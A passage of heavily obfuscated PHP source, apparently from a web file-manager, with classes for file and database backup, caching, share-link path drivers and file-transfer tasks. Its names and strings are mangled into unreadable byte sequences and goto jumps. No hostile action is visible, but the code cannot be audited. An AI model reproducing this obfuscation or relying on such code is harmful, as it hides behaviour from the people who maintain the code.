$ŠéÅ¨í½ =& $_SERVER[Ãìšã«™]; $öâªÏ‘Ë = str_rtrim(parent::getHost(), $ŠéÅ¨í½[8] . $this->bucket); $öâªÏ‘Ë = explode($ŠéÅ¨í½[176], $öâªÏ‘Ë); return $öâªÏ‘Ë[0] . $ŠéÅ¨í½[176] . $this->bucket . $ŠéÅ¨í½[10] . $öâªÏ‘Ë[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($É’½‡, $êñÚ´”Õ = 0) { parent::__construct(); $this->source = $É’½‡; $this->sourceSize = $êñÚ´”Õ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($•çˆº¬ = false) { return $this->sourceSize; } public function getContent($ı¤ ËûŠ = false) { return $this->fileSubstr($ı¤ ËûŠ, 0, $this->sourceSize); } public function fileSubstr($¾ á¯È = false, $§ôä‰ş = 0, $¯´âƒµ = 0) { if (!$¯´âƒµ) { $¯´âƒµ = $this->sourceSize; } $•¼ªûä« = $this->sourceSize - $§ôä‰ş; if ($¯´âƒµ >= $•¼ªûä«) { $¯´âƒµ = $•¼ªûä«; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§ôä‰ş, $¯´âƒµ); } if ($this->sourceType == self::TYPE_FILE) { if ($¯´âƒµ <= 0) { return $_SERVER[Ãìšã«™][12]; } $ØÇ‹Ø± = ftell($this->source); fseek_64($this->source, $ØÇ‹Ø± + $§ôä‰ş); $›¬Áôş¯ = @fread($this->source, $¯´âƒµ); fseek_64($this->source, $ØÇ‹Ø±); return $›¬Áôş¯; } } public function hashMd5($Š€êº„¿ = false) { return md5($this->getContent()); } public static function hash($´ÃñÛÏ, $ÅºìÛıµ = 0) { $‚ñ¬‚õ© = new PathDriverStream($´ÃñÛÏ, $ÅºìÛıµ); return $‚ñ¬‚õ©->hashSimple($´ÃñÛÏ); } public static function md5($‚ÙÍÚ¶, $ù¤¦Âƒ¹ = 0) { $í–î”Õó = new PathDriverStream($‚ÙÍÚ¶, $ù¤¦Âƒ¹); return $í–î”Õó->hashMd5($‚ÙÍÚ¶); } } goto dë±ß  –Í; FÎ‘ìÎÆÚÀ: class BackupDbFile { public function __construct() { } public function index() { $«¬é”ç =& $_SERVER[Ãìšã«™]; $ˆƒâ¾ë­ = Backup::get(); $Ì°‡Ñô = $ˆƒâ¾ë­[$«¬é”ç[32]]; $õ¯±Ö¹¶ = $this->tmpFilesPath() . "\142\141\x63\153\x75\x70\137{$Ì°‡Ñô}\x2f"; $¾†Ãš”  = $this->backupPath($ˆƒâ¾ë­); if (!($¾†Ãš”  = IO::mkdir($¾†Ãš” ))) { return !1; } $½™ÔÍË‡ = IO::listPath($õ¯±Ö¹¶); $¥©¢‡´É = isset($½™ÔÍË‡[$«¬é”ç[76]]) ? $½™ÔÍË‡[$«¬é”ç[76]] : array(); $‘¬êŒ•­ = array_sum(array_column($¥©¢‡´É, $«¬é”ç[80])); if (!$‘¬êŒ•­) { return !1; } $ÅÚ†Õä = array($«¬é”ç[799] => $‘¬êŒ•­, $«¬é”ç[800] => time()); Backup::set($ÅÚ†Õä); $ŠÉ­À¼ = new TaskFileTransfer($«¬é”ç[801], $«¬é”ç[781], count($¥©¢‡´É), LNG($«¬é”ç[782]) . $«¬é”ç[460] . LNG($«¬é”ç[784]) . $«¬é”ç[802]); $ŠÉ­À¼->task[$«¬é”ç[764]] = $‘¬êŒ•­; foreach ($½™ÔÍË‡[$«¬é”ç[76]] as $âÁß›‡ˆ) { $ÒÅœè¯ş = IO::move($âÁß›‡ˆ[$«¬é”ç[78]], $¾†Ãš” ); if (!$ÒÅœè¯ş) { $ŠÉ­À¼->end(); $‚†ë¸ëÚ = IO::getLastError($«¬é”ç[803] . $âÁß›‡ˆ[$«¬é”ç[78]] . $«¬é”ç[804] . $¾†Ãš”  . $«¬é”ç[536]); write_log($‚†ë¸ëÚ, $«¬é”ç[781]); return !1; } } $ãÚ‹÷ó™ = new DbManage(); $Ü®ˆ¤ = $ãÚ‹÷ó™->getSqlFile(); if (!$Ü®ˆ¤[$«¬é”ç[805]] || !$Ü®ˆ¤[$«¬é”ç[13]]) { return !1; } IO::move($Ü®ˆ¤[$«¬é”ç[805]], $¾†Ãš” ); IO::move($Ü®ˆ¤[$«¬é”ç[13]], $¾†Ãš” ); $ŠÉ­À¼->end(); $ÅÚ†Õä = array($«¬é”ç[806] => $‘¬êŒ•­, $«¬é”ç[807] => time()); Backup::set($ÅÚ†Õä); return !0; } private function backupPath($«äçØöå) { $Çıí–úà =& $_SERVER[Ãìšã«™]; $áğª  = $«äçØöå[$Çıí–úà[32]]; $ßÙä•Ù¬ = Model($Çıí–úà[771])->get($Çıí–úà[772]); $õÁŞÒ½› = substr(md5($Çıí–úà[773] . $ßÙä•Ù¬ . $áğª ), 0, 8); return "\x7b\151\x6f\x3a{$«äçØöå[$Çıí–úà[753]]}\175\x2f\144\x61\164\141\x62\x61\x73\145\x2f\x62\x61\x63\x6b\165\160\x2f" . $áğª  . $Çıí–úà[11] . $õÁŞÒ½›; } private function tmpFilesPath() { $”úÌŸ·Ü =& $_SERVER[Ãìšã«™]; $¼ÌŠ „ = TEMP_FILES; if ($GLOBALS[$”úÌŸ·Ü[6]][$”úÌŸ·Ü[90]][$”úÌŸ·Ü[797]]) { $¼ÌŠ „ = $GLOBALS[$”úÌŸ·Ü[6]][$”úÌŸ·Ü[90]][$”úÌŸ·Ü[797]]; if (!mk_dir($¼ÌŠ „) || !is_writable($¼ÌŠ „) || !IO::mkfile($¼ÌŠ „ . $”úÌŸ·Ü[798])) { $¼ÌŠ „ = TEMP_FILES; } } return $¼ÌŠ „; } } class BackupFile { public function __construct() { } public function index() { $ùàğ»¦— = Backup::get(); $İ”µá— = $ùàğ»¦—[$_SERVER[Ãìšã«™][288]][$_SERVER[Ãìšã«™][192]][$_SERVER[Ãìšã«™][467]]; $®ÓÒ€ªÛ = array($_SERVER[Ãìšã«™][468] => array($_SERVER[Ãìšã«™][808], $İ”µá—), $_SERVER[Ãìšã«™][809] => array($_SERVER[Ãìšã«™][326], $ùàğ»¦—[$_SERVER[Ãìšã«™][753]])); $Ïï¼‚øê = (int) Model($_SERVER[Ãìšã«™][790])->where($®ÓÒ€ªÛ)->count($_SERVER[Ãìšã«™][467]); $ƒßã§ëç = (int) Model($_SERVER[Ãìšã«™][790])->where($®ÓÒ€ªÛ)->sum($_SERVER[Ãìšã«™][80]); $şĞô¦£Ñ = new TaskFileTransfer($_SERVER[Ãìšã«™][810], $_SERVER[Ãìšã«™][781], $Ïï¼‚øê, LNG($_SERVER[Ãìšã«™][782]) . $_SERVER[Ãìšã«™][783] . LNG($_SERVER[Ãìšã«™][811])); $şĞô¦£Ñ->task[$_SERVER[Ãìšã«™][764]] = $ƒßã§ëç; $é‚ƒè• = array($_SERVER[Ãìšã«™][812] => $Ïï¼‚øê, $_SERVER[Ãìšã«™][813] => $ƒßã§ëç, $_SERVER[Ãìšã«™][814] => time()); Backup::set($é‚ƒè•); $ë»ïçĞ¿ = !0; $»ã­¨„õ = $this->storeIds(); $ê¬ÜÓŸ = 1; $«Ãù±—È = 1000; $áÆŞæ» = $ï—äößŠ = 0; $÷ŠÎô¼Ğ = array(); $Ûúƒ¯Ëæ = $Êì÷Š™ò = 0; do { $‹ø¬Š“ = $_SERVER[Ãìšã«™][815]; $ÓÖô¤®ù = Model($_SERVER[Ãìšã«™][790])->where($®ÓÒ€ªÛ)->field($‹ø¬Š“)->order($_SERVER[Ãìšã«™][816])->selectPage($«Ãù±—È, $ê¬ÜÓŸ); $±şÊğò = !empty($ÓÖô¤®ù[$_SERVER[Ãìšã«™][364]]) ? $ÓÖô¤®ù[$_SERVER[Ãìšã«™][364]] : array(); foreach ($±şÊğò as $µè‰ òÚ) { if (!$this->_fileExist($µè‰ òÚ, $÷ŠÎô¼Ğ, $»ã­¨„õ)) { $Ïï¼‚øê -= 1; $ƒßã§ëç -= (int) $µè‰ òÚ[$_SERVER[Ãìšã«™][80]]; write_log("\146\151\x6c\x65\40\x6e\157\x74\x20\145\170\x69\163\x74\56\146\x69\154\145\111\x44\72{$µè‰ òÚ[$_SERVER[Ãìšã«™][467]]}\x2c\40\x70\141\164\x68\x3a{$µè‰ òÚ[$_SERVER[Ãìšã«™][78]]}", $_SERVER[Ãìšã«™][817]); continue; } $ÈšÏíü = $µè‰ òÚ[$_SERVER[Ãìšã«™][78]]; $ŒæÊççï = "\173\x69\x6f\72{$ùàğ»¦—[$_SERVER[Ãìšã«™][753]]}\x7d" . substr($ÈšÏíü, strlen("\x7b\x69\x6f\x3a{$µè‰ òÚ[$_SERVER[Ãìšã«™][818]]}\175")); if (IO::exist($ŒæÊççï)) { $şĞô¦£Ñ->updateFileEnd($µè‰ òÚ[$_SERVER[Ãìšã«™][32]], $µè‰ òÚ[$_SERVER[Ãìšã«™][80]]); } else { $ŒæÊççï = get_path_father($ŒæÊççï); IO::mkdir($ŒæÊççï); if (!IO::copy($ÈšÏíü, $ŒæÊççï, $_SERVER[Ãìšã«™][819])) { write_log($_SERVER[Ãìšã«™][820] . $ÈšÏíü . $_SERVER[Ãìšã«™][804] . $ŒæÊççï . $_SERVER[Ãìšã«™][536], $_SERVER[Ãìšã«™][781]); $ë»ïçĞ¿ = !1; break; } } $İ”µá— = $µè‰ òÚ[$_SERVER[Ãìšã«™][467]]; $ï—äößŠ += 1; $áÆŞæ» += $µè‰ òÚ[$_SERVER[Ãìšã«™][80]]; $Êì÷Š™ò += 1; $Ûúƒ¯Ëæ += $µè‰ òÚ[$_SERVER[Ãìšã«™][80]]; if ($áÆŞæ» >= 1024 * 1024 * 100) { $é‚ƒè• = array($_SERVER[Ãìšã«™][821] => $İ”µá—, $_SERVER[Ãìšã«™][822] => $Êì÷Š™ò, $_SERVER[Ãìšã«™][823] => $Ûúƒ¯Ëæ); Backup::set($é‚ƒè•); $áÆŞæ» = $ï—äößŠ = 0; } } $„§ìÊö” = count($±şÊğò); $ê¬ÜÓŸ++; } while ($„§ìÊö” == $«Ãù±—È); $şĞô¦£Ñ->end(); $é‚ƒè• = array($_SERVER[Ãìšã«™][824] => 1, $_SERVER[Ãìšã«™][496] => time(), $_SERVER[Ãìšã«™][776] => 1, $_SERVER[Ãìšã«™][821] => $İ”µá—, $_SERVER[Ãìšã«™][813] => $ƒßã§ëç, $_SERVER[Ãìšã«™][812] => $Ïï¼‚øê, $_SERVER[Ãìšã«™][825] => time()); if ($ï—äößŠ) { $é‚ƒè•[$_SERVER[Ãìšã«™][822]] = $Êì÷Š™ò; $é‚ƒè•[$_SERVER[Ãìšã«™][823]] = $Ûúƒ¯Ëæ; } Backup::set($é‚ƒè•); $this->_fileFilter($÷ŠÎô¼Ğ); return !0; } private function _fileExist($á˜ğÂÛÙ, &$¡üÇù¶, $Ş—ÇûŞ) { $ğ¯Ş—€ç =& $_SERVER[Ãìšã«™]; $¼öšı§¼ = $á˜ğÂÛÙ[$ğ¯Ş—€ç[78]]; if (in_array($á˜ğÂÛÙ[$ğ¯Ş—€ç[467]], $¡üÇù¶)) { return !1; } if (!in_array($á˜ğÂÛÙ[$ğ¯Ş—€ç[818]], $Ş—ÇûŞ)) { return !1; } if (IO::exist($¼öšı§¼)) { return !0; } $ÇğÁù¹• = get_path_father($¼öšı§¼); if (IO::exist($ÇğÁù¹•)) { $¡üÇù¶[] = $á˜ğÂÛÙ[$ğ¯Ş—€ç[467]]; return !1; } $ÊÓÅş = array($ğ¯Ş—€ç[818] => $á˜ğÂÛÙ[$ğ¯Ş—€ç[818]], $ğ¯Ş—€ç[78] => array($ğ¯Ş—€ç[378], "{$ÇğÁù¹•}\45")); $¾Û´ÆÃÊ = Model($ğ¯Ş—€ç[790])->where($ÊÓÅş)->field($ğ¯Ş—€ç[468])->select(); $¡üÇù¶ = array_merge($¡üÇù¶, array_to_keyvalue($¾Û´ÆÃÊ, $ğ¯Ş—€ç[12], $ğ¯Ş—€ç[467])); return !1; } private function _fileFilter($§¾´¿Áê) { $¸¿ü¿º =& $_SERVER[Ãìšã«™]; if (empty($§¾´¿Áê)) { return; } $…±Àõùâ = array($¸¿ü¿º[467] => array($¸¿ü¿º[7], array_unique($§¾´¿Áê))); $‘œö½‰Í = Model($¸¿ü¿º[826])->where($…±Àõùâ)->field($¸¿ü¿º[403])->select(); foreach ($‘œö½‰Í as $û½ª©¦) { Model($¸¿ü¿º[826])->remove($û½ª©¦[$¸¿ü¿º[403]], !1); } } private function storeIds() { $îÉ˜œ˜ş =& $_SERVER[Ãìšã«™]; $ïÀƒçÑ¡ = Model($îÉ˜œ˜ş[768])->listData(); $¯Ş‘ú–½ = array(); $‰Ä–ù’— = $GLOBALS[$îÉ˜œ˜ş[6]][$îÉ˜œ˜ş[90]][$îÉ˜œ˜ş[827]]; foreach ($ïÀƒçÑ¡ as $¡ŠÅ‰ÆÍ) { $ıŞ†Ê±Á = strtolower($¡ŠÅ‰ÆÍ[$îÉ˜œ˜ş[96]]); if (!isset($‰Ä–ù’—[$ıŞ†Ê±Á])) { continue; } $°ÒÍ¹£Ş = $îÉ˜œ˜ş[74] . (isset($‰Ä–ù’—[$ıŞ†Ê±Á]) ? $‰Ä–ù’—[$ıŞ†Ê±Á] : ucfirst($ıŞ†Ê±Á)); if (!class_exists($°ÒÍ¹£Ş)) { continue; } $¯Ş‘ú–½[] = $¡ŠÅ‰ÆÍ[$îÉ˜œ˜ş[392]]; } return $¯Ş‘ú–½; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Øâ½ç­ =& $_SERVER[Ãìšã«™]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÉÇ§¶Úù = $GLOBALS[$Øâ½ç­[6]][$Øâ½ç­[344]]; $íúß°şÔ = $ÉÇ§¶Úù[$ÉÇ§¶Úù[$Øâ½ç­[828]]]; $äõ›á¦ = $ÉÇ§¶Úù[$Øâ½ç­[829]]; switch ($ÉÇ§¶Úù[$Øâ½ç­[828]]) { case $Øâ½ç­[21]: self::$handle = Model($Øâ½ç­[830]); break; case $Øâ½ç­[831]: self::$handle = new CacheRedis($íúß°şÔ, $äõ›á¦); break; case $Øâ½ç­[832]: self::$handle = new CacheMemcached($íúß°şÔ, $äõ›á¦); break; case $Øâ½ç­[192]: self::$handle = new CacheFile($íúß°şÔ, $äõ›á¦); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($“»„Ğ¿Æ) { if (is_array($“»„Ğ¿Æ) || is_object($“»„Ğ¿Æ)) { $“»„Ğ¿Æ = json_encode($“»„Ğ¿Æ); } $“»„Ğ¿Æ = rawurlencode($“»„Ğ¿Æ); return md5(KOD_SITE_ID . $_SERVER[Ãìšã«™][11] . $“»„Ğ¿Æ); } public static function get($Å‘æ‹¸, $Ô«¦´ = false) { $½á„»˜— = self::key($Å‘æ‹¸); if ($Ô«¦´) { return unserialize(self::init()->get($½á„»˜—)); } if (!isset(self::$memoryCache[$½á„»˜—])) { $Éåö®‹Ü = self::init()->get($½á„»˜—); self::$memoryCache[$½á„»˜—] = unserialize($Éåö®‹Ü); } return self::$memoryCache[$½á„»˜—]; } public static function set($Ø¡¶ò¿§, $ø¹†ä®Ô, $ó”‰·ğˆ = false) { $ŠÕ•Ùº = self::key($Ø¡¶ò¿§); if (isset(self::$memoryCache[$ŠÕ•Ùº]) && self::$memoryCache[$ŠÕ•Ùº] === $ø¹†ä®Ô) { return !0; } if ($ó”‰·ğˆ === 0) { self::$memoryCache[$ŠÕ•Ùº] = $ø¹†ä®Ô; return !0; } CacheLock::lock($Ø¡¶ò¿§); $ŠÛ—í¿ = self::init()->set($ŠÕ•Ùº, serialize($ø¹†ä®Ô), $ó”‰·ğˆ); self::$memoryCache[$ŠÕ•Ùº] = $ø¹†ä®Ô; CacheLock::unlock($Ø¡¶ò¿§); return $ŠÛ—í¿; } public static function getCall($•Ö¯¦›, $Ã÷¤¶Á, $‘ã¤ŞûÒ, $û¼„ãßÃ = array()) { $û±ˆéÁÍ =& $_SERVER[Ãìšã«™]; $§ßø§ğ = self::get($•Ö¯¦›); if ($§ßø§ğ || $§ßø§ğ === $û±ˆéÁÍ[12]) { return $§ßø§ğ; } $§ßø§ğ = call_user_func_array($‘ã¤ŞûÒ, $û¼„ãßÃ); $§ßø§ğ = $§ßø§ğ ? $§ßø§ğ : $û±ˆéÁÍ[12]; self::set($•Ö¯¦›, $§ßø§ğ, $Ã÷¤¶Á); return $§ßø§ğ; } public static function remove($Ÿ†œ±±) { $²£”öİ€ = self::key($Ÿ†œ±±); unset(self::$memoryCache[$²£”öİ€]); self::clearTimeout(); CacheLock::lock($Ÿ†œ±±); $ï¤–ÑÏ = self::init()->remove($²£”öİ€); CacheLock::unlock($Ÿ†œ±±); return $ï¤–ÑÏ; } public static function removeMemory($Ö¢ŞÜ—¼) { $Â™»¢¯• = self::key($Ö¢ŞÜ—¼); unset(self::$memoryCache[$Â™»¢¯•]); } public static function clearMemory($†§’â› = false) { if ($†§’â›) { $†§’â› = self::key($†§’â›); unset(self::$memoryCache[$†§’â›]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ãìšã«™][833])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ãìšã«™][834])) { self::init()->clearTimeout(); } } } goto Câ¬µ”¯Òˆ; BøÔÙ•Ç: class PathDriverDbShareLink extends PathDriverDB { public function __construct($“º¾àÂ§) { $this->pathParse = $“º¾àÂ§; $this->model = Model($_SERVER[Ãìšã«™][1321]); } protected function infoParse($Àß§”‰, $€Ş´‹Ø» = false, $·öÅÁ“ = false) { $’…ƒ¿‹‹ =& $_SERVER[Ãìšã«™]; return Action($’…ƒ¿‹‹[1169])->sharePathInfo($this->pathParse[$’…ƒ¿‹‹[78]], !0, $€Ş´‹Ø»); } public function listPath($ş´Ëˆ÷Î, $êìú£Ëø = false) { $£îÅÄìÚ =& $_SERVER[Ãìšã«™]; $²ıôä¢ä = parent::listPath($ş´Ëˆ÷Î, $êìú£Ëø); if (!$²ıôä¢ä) { return $²ıôä¢ä; } if (is_array($²ıôä¢ä[$£îÅÄìÚ[1330]])) { $²ıôä¢ä[$£îÅÄìÚ[1330]] = Action($£îÅÄìÚ[1169])->shareItemInfo($²ıôä¢ä[$£îÅÄìÚ[1330]]); } foreach ($²ıôä¢ä as $øá›â æ => $ƒÓÛ¸á°) { if (!in_array($øá›â æ, array($£îÅÄìÚ[76], $£îÅÄìÚ[77]))) { continue; } foreach ($ƒÓÛ¸á° as $ßöïûæã => $Š¬°äãĞ) { $²ıôä¢ä[$øá›â æ][$ßöïûæã] = Action($£îÅÄìÚ[1169])->shareItemInfo($Š¬°äãĞ); } } return $²ıôä¢ä; } public function listAll($…à«Ïˆ°) { $¢Êñ…Ãõ =& $_SERVER[Ãìšã«™]; $Ÿæ¾Õ“ğ = IO::info($this->pathParse[$¢Êñ…Ãõ[78]]); if (!$Ÿæ¾Õ“ğ) { return array(); } $ÙøñÛ”“ = $this->model->listAll($…à«Ïˆ°); foreach ($ÙøñÛ”“ as &$¤ßíòé´) { $¤ßíòé´[$¢Êñ…Ãõ[87]] = Action($¢Êñ…Ãõ[1169])->shareItemInfo($¤ßíòé´[$¢Êñ…Ãõ[87]]); } unset($¤ßíòé´); return $ÙøñÛ”“; } } class PathDriverDriverShareItem { public function __construct($Ïü“Ê‚) { $this->pathParse = $Ïü“Ê‚; } public function __call($ó³‚Ğ½é, $¹ÓëÇâ²) { $Ø¼•¬š‚ =& $_SERVER[Ãìšã«™]; if (method_exists($this, $ó³‚Ğ½é)) { return; } $Í«´¼ñ” = call_user_func_array(array($Ø¼•¬š‚[1331], $ó³‚Ğ½é), $¹ÓëÇâ²); $ğ²ò¼ = array($Ø¼•¬š‚[1332], $Ø¼•¬š‚[1333], $Ø¼•¬š‚[1334], $Ø¼•¬š‚[1335], $Ø¼•¬š‚[549], $Ø¼•¬š‚[551], $Ø¼•¬š‚[1336], $Ø¼•¬š‚[108], $Ø¼•¬š‚[1337], $Ø¼•¬š‚[1338]); if (in_array($ó³‚Ğ½é, $ğ²ò¼)) { $Í«´¼ñ” = $this->getPathOuter($Í«´¼ñ”); } return $Í«´¼ñ”; } public function copy($ÄÂ·İÄ, $Ş®ßöˆŒ, $²Óü°–ú = false, $ÃÅ¸—“Ô = false) { return $this->copyMove($ÄÂ·İÄ, $Ş®ßöˆŒ, $²Óü°–ú, $_SERVER[Ãìšã«™][549], $ÃÅ¸—“Ô); } public function move($·’¬…ö¢, $Îï»—à¿, $‹ƒ’µ‰÷ = false, $ºÌ±¿Í = false) { return $this->copyMove($·’¬…ö¢, $Îï»—à¿, $‹ƒ’µ‰÷, $_SERVER[Ãìšã«™][551], $ºÌ±¿Í); } private function copyMove($ÉıÇòğ«, $‚Š™ØÜ», $›Í‚œ, $°Å¦Ùş‚, $Ä¾©¾Úû = false) { $„ŸäîÏÈ =& $_SERVER[Ãìšã«™]; $¡šÌÑÎ­ = $‚Š™ØÜ»; $‘²ü±´ = IO::driverMake($‚Š™ØÜ»); if ($‘²ü±´->pathParse[$„ŸäîÏÈ[1147]]) { $‚Š™ØÜ» = $‘²ü±´->pathParse[$„ŸäîÏÈ[1147]]; } else { $‚Š™ØÜ» = $¡šÌÑÎ­; } $ï”†ÍÜ = IO::copyMove($ÉıÇòğ«, $‚Š™ØÜ», $›Í‚œ, $°Å¦Ùş‚, $Ä¾©¾Úû); $ï”†ÍÜ = $this->getPathOuter($ï”†ÍÜ); return $ï”†ÍÜ; } public function pathThis($ÚÜŠÍ‡¡) { return get_path_this($this->pathParse[$_SERVER[Ãìšã«™][78]]); } public function pathFather($™ëœµ¶í) { return get_path_father($this->pathParse[$_SERVER[Ãìšã«™][78]]); } public function iconvSystem($¼İ®¤) { return $¼İ®¤; } protected function infoParse($’„Ğš¥Ë, $ãàà°§ = false) { $‡ØÉşÓ— =& $_SERVER[Ãìšã«™]; $ô“Õ‘æ¤ = $this->pathParse[$‡ØÉşÓ—[486]][$‡ØÉşÓ—[1170]] . $this->pathParse[$‡ØÉşÓ—[1163]]; if ($ãàà°§) { $ş€Ë ™¡ = IO::infoWithChildren($ô“Õ‘æ¤); } else { $ş€Ë ™¡ = IO::info($ô“Õ‘æ¤); } $ÏÃ¡¡ô = $this->pathParse[$‡ØÉşÓ—[486]]; return Action($‡ØÉşÓ—[1329])->_shareItemeParse($ş€Ë ™¡, $ÏÃ¡¡ô); } public function listAll($”¼ğ°¾) { $ÈòåĞ =& $_SERVER[Ãìšã«™]; $ôŞÚÊà = IO::listAll($”¼ğ°¾); $õ˜ëêİ© = $this->pathParse[$ÈòåĞ[486]]; foreach ($ôŞÚÊà as &$üÎˆşãå) { check_abort(); $Å’®Úµè = IO::info($üÎˆşãå[$ÈòåĞ[78]]); $Å’®Úµè = is_array($Å’®Úµè) ? $Å’®Úµè : array(); $üÎˆşãå = array_merge($Å’®Úµè, $üÎˆşãå); $üÎˆşãå[$ÈòåĞ[87]] = Action($ÈòåĞ[1329])->_shareItemeParse($üÎˆşãå, $õ˜ëêİ©); } unset($üÎˆşãå); return $ôŞÚÊà; } public function getPathOuter($ôÅ«Îƒ‰) { $û¹Šş×Æ =& $_SERVER[Ãìšã«™]; $ÅßƒŞòä = KodIO::parse($ôÅ«Îƒ‰); if ($ÅßƒŞòä[$û¹Šş×Æ[33]] == KodIO::KOD_SHARE_ITEM) { return $ÅßƒŞòä[$û¹Šş×Æ[78]]; } $Ş›·ÄÎ = KodIO::clear($ôÅ«Îƒ‰); $Õ–Á¯ÖÇ = KodIO::clear($this->pathParse[$û¹Šş×Æ[486]][$û¹Šş×Æ[1170]]); $ÁëÊ¸†– = substr($Ş›·ÄÎ, strlen($Õ–Á¯ÖÇ)); if (substr($Ş›·ÄÎ, 0, strlen($Õ–Á¯ÖÇ)) != $Õ–Á¯ÖÇ) { return !1; } return $this->pathParse[$û¹Šş×Æ[1164]] . $û¹Šş×Æ[8] . ltrim($ÁëÊ¸†–, $û¹Šş×Æ[8]); } public function getType() { $¿Áõô©Ü =& $_SERVER[Ãìšã«™]; $¨‹€ïÅâ = str_replace($¿Áõô©Ü[74], $¿Áõô©Ü[12], get_class($this)); return strtolower($¨‹€ïÅâ); } public function isTypeObject($ĞÛ¶¨Ôõ) { return IO::isTypeObject($ĞÛ¶¨Ôõ); } public function info($ó Ó¾¿ğ) { return $this->infoParse($ó Ó¾¿ğ); } public function infoAuth($‘ìİÏ§´) { return $this->infoParse($‘ìİÏ§´); } public function infoWithChildren($ÑÛÛÓÉ) { return $this->infoParse($ÑÛÛÓÉ, !0); } public function infoFull($•À¦«Õ) { return $this->infoParse($•À¦«Õ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ü¼¶Äù) { $this->pathParse = $Ü¼¶Äù; } protected function infoParse($ùÖ­î©ç, $üÀ†ç’¶ = false) { $Öî°¿¥ =& $_SERVER[Ãìšã«™]; return Action($Öî°¿¥[1169])->sharePathInfo($this->pathParse[$Öî°¿¥[78]], !0, $üÀ†ç’¶); } public function listPath($ğ©±ÑğÂ, $µ£ã‘ƒ¥ = false) { $éø©£µğ =& $_SERVER[Ãìšã«™]; $™½”Ÿ Œ = IO::listPath($ğ©±ÑğÂ, $µ£ã‘ƒ¥); if (!$™½”Ÿ Œ) { return $™½”Ÿ Œ; } if (is_array($™½”Ÿ Œ[$éø©£µğ[1330]])) { $›ÈöÌá¡ = Action($éø©£µğ[1339])->parsePathChildren($™½”Ÿ Œ[$éø©£µğ[1330]], array($éø©£µğ[422] => $ğ©±ÑğÂ)); $™½”Ÿ Œ[$éø©£µğ[1330]] = Action($éø©£µğ[1169])->shareItemInfo($›ÈöÌá¡); } foreach ($™½”Ÿ Œ as $±ù™ã– => $ š‡ªÎ) { if (!in_array($±ù™ã–, array($éø©£µğ[76], $éø©£µğ[77]))) { continue; } foreach ($ š‡ªÎ as $ûÓ¶ïıÖ => $›ÈöÌá¡) { $›ÈöÌá¡ = Action($éø©£µğ[1339])->parsePathChildren($›ÈöÌá¡, array($éø©£µğ[422] => $ğ©±ÑğÂ)); $™½”Ÿ Œ[$±ù™ã–][$ûÓ¶ïıÖ] = Action($éø©£µğ[1169])->shareItemInfo($›ÈöÌá¡); } } return $™½”Ÿ Œ; } public function listAll($û€¸¶) { $ÑÁÈ¬ò‰ =& $_SERVER[Ãìšã«™]; $’ô·şÏŒ = IO::listAll($û€¸¶); foreach ($’ô·şÏŒ as &$¶Í¥‰›ë) { $¢ˆ¦öÍ¡ = IO::info($¶Í¥‰›ë[$ÑÁÈ¬ò‰[78]]); $¢ˆ¦öÍ¡ = is_array($¢ˆ¦öÍ¡) ? $¢ˆ¦öÍ¡ : array(); $¶Í¥‰›ë = array_merge($¢ˆ¦öÍ¡, $¶Í¥‰›ë); $¶Í¥‰›ë[$ÑÁÈ¬ò‰[87]] = Action($ÑÁÈ¬ò‰[1169])->shareItemInfo($¶Í¥‰›ë); } unset($¶Í¥‰›ë); return $’ô·şÏŒ; } } goto F¥œÜÊä–ä; aÍÎëè¢ò: class TaskFileTransfer extends Task { protected function startAfter() { $±œöüşÜ =& $_SERVER[Ãìšã«™]; $ÒÏ¡ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($±œöüşÜ[1678], array($this, $±œöüşÜ[1679])); Hook::bind($±œöüşÜ[1209], array($this, $±œöüşÜ[1680])); Hook::bind($±œöüşÜ[1681], array($this, $±œöüşÜ[1682])); Hook::bind($±œöüşÜ[598], array($this, $±œöüşÜ[1683])); Hook::bind($±œöüşÜ[599], array($this, $±œöüşÜ[1684])); Hook::bind($±œöüşÜ[601], array($this, $±œöüşÜ[1685])); Hook::bind($±œöüşÜ[602], array($this, $±œöüşÜ[1685])); Hook::bind($±œöüşÜ[568], array($this, $±œöüşÜ[1686])); Hook::bind($±œöüşÜ[565], array($this, $±œöüşÜ[1686])); Hook::bind($±œöüşÜ[570], array($this, $±œöüşÜ[1686])); Hook::bind($±œöüşÜ[572], array($this, $±œöüşÜ[1686])); Hook::bind($±œöüşÜ[574], array($this, $±œöüşÜ[1686])); Hook::bind($±œöüşÜ[1687], array($this, $±œöüşÜ[1688])); Hook::bind($±œöüşÜ[591], array($this, $±œöüşÜ[1689])); $this->sourceModelCopyFlag = !1; Hook::bind($±œöüşÜ[1690], array($this, $±œöüşÜ[1691])); Hook::bind($±œöüşÜ[1692], array($this, $±œöüşÜ[1693])); Hook::bind($±œöüşÜ[1694], array($this, $±œöüşÜ[1695])); $ÒÏ¡[$±œöüşÜ[1696]] = LNG($±œöüşÜ[1697]); $ÒÏ¡[$±œöüşÜ[1698]] = 0; $ÒÏ¡[$±œöüşÜ[1699]] = 0; $ÒÏ¡[$±œöüşÜ[1060]] = $±œöüşÜ[12]; $ÒÏ¡[$±œöüşÜ[1700]] = $±œöüşÜ[12]; $ÒÏ¡[$±œöüşÜ[1701]] = 0; $ÒÏ¡[$±œöüşÜ[1702]] = 0; $ÒÏ¡[$±œöüşÜ[1703]] = 0; if (!$ÒÏ¡[$±œöüşÜ[1548]]) { $ÒÏ¡[$±œöüşÜ[1548]] = LNG($±œöüşÜ[1704]); } } protected function endAfter() { $à“Œàì¸ =& $_SERVER[Ãìšã«™]; Hook::unbind($à“Œàì¸[1678], array($this, $à“Œàì¸[1679])); Hook::unbind($à“Œàì¸[1209], array($this, $à“Œàì¸[1680])); Hook::unbind($à“Œàì¸[1681], array($this, $à“Œàì¸[1682])); Hook::unbind($à“Œàì¸[598], array($this, 